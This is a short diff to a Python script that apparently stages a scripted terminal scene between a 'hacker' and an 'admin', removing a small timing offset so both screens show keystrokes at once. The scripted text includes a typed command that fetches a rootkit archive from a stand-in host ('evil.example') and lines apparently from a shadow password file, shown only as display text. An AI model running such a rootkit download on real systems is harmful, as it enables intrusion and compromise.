@@ -227,17 +227,17 @@ shadow_lines = [
 ]
 for i, line in enumerate(shadow_lines):
     at(t + i * 0.18, HACKER, line)
-    at(t + i * 0.18 + 0.005, ADMIN, line)
+    at(t + i * 0.18, ADMIN, line)
 t_after_cat = t + len(shadow_lines) * 0.18 + 0.10
 at(t_after_cat, HACKER, hacker_prompt())
-at(t_after_cat + 0.005, ADMIN, hacker_prompt())
+at(t_after_cat, ADMIN, hacker_prompt())
 
 # Hacker types another bad command
 t = t_after_cat + 0.6
 typed = "wget http://evil.example/rootkit.tar.gz"
 for ch in typed:
     at(t, HACKER, ch)
-    at(t + 0.005, ADMIN, ch)
+    at(t, ADMIN, ch)
     delay = (1.0 / 14) * (1 + random.uniform(-0.4, 0.4))
     t += max(0.02, delay)
 
@@ -342,12 +342,12 @@ t = t_react
 typed = "nothi"
 for ch in typed:
     at(t, HACKER, ch)
-    at(t + 0.005, ADMIN, ch)
+    at(t, ADMIN, ch)
     t += 0.18
 # Backspaces (slowly, like they're rethinking)
 for _ in range(len(typed)):
     at(t, HACKER, "\x08 \x08")
-    at(t + 0.005, ADMIN, "\x08 \x08")
+    at(t, ADMIN, "\x08 \x08")
     t += 0.10
 t += 0.4
 
@@ -355,7 +355,7 @@ t += 0.4
 typed = "i was just looking around, im sorry"
 for ch in typed:
     at(t, HACKER, ch)
-    at(t + 0.005, ADMIN, ch)
+    at(t, ADMIN, ch)
     delay = (1.0 / 9) * (1 + random.uniform(-0.5, 0.5))
     t += max(0.04, delay)
 
